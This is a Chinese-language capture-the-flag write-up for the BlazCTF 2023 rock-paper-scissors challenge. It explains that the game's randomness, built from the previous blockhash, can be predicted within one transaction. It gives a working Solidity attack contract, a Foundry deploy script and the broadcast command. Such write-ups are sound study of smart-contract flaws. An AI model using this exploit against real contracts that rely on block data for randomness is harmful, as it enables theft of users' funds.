题目来自 https://github.com/fuzzland/blazctf-2023/tree/main/challenges/rock-paper-scissor

使用blocknumber作为随机数参数是非常危险的。
跨合约调用的block信息相同，因为它们在同一交易内执行，EVM确保区块信息在整个交易过程中一致。
因此我们可以编写攻击合约代码如下。该合约获取了Challenge合约相同的 `randomShape` （其中msg.sender改成了攻击合约的地址）。然后发送必胜的结果就行。

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

enum Hand {
    Rock,
    Paper,
    Scissors
}

interface IRockPaperScissors {
    function tryToBeatMe(Hand yours) external payable;
}

interface IChallenge {
    function rps() external view returns (address);
}

contract Solution {
    IChallenge challenge;
    IRockPaperScissors rps;

    constructor(address challengeAddress) {
        challenge = IChallenge(challengeAddress);
        rps = IRockPaperScissors(challenge.rps());
    }

    function randomShape() internal view returns (Hand) {
        return Hand(uint256(keccak256(abi.encodePacked(address(this), blockhash(block.number - 1)))) % 3);    
    }

    function execute() external payable {
        Hand target = randomShape();
        uint8 choice = (uint8(target) + 1) % 3;
        Hand choiceHand = Hand(choice);
        rps.tryToBeatMe{value: msg.value}(choiceHand);
    }
}
```

部署脚本如下

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Solution} from "../src/Solution.sol";

contract DeployScript is Script {
    Solution public solution;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        solution = new Solution(0x8661783352F06be92EB46424881d88AE65d18e6E);
        solution.execute();       
        vm.stopBroadcast();
    }
}
```

执行命令

forge script script/Deploy.s.sol:DeployScript --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast
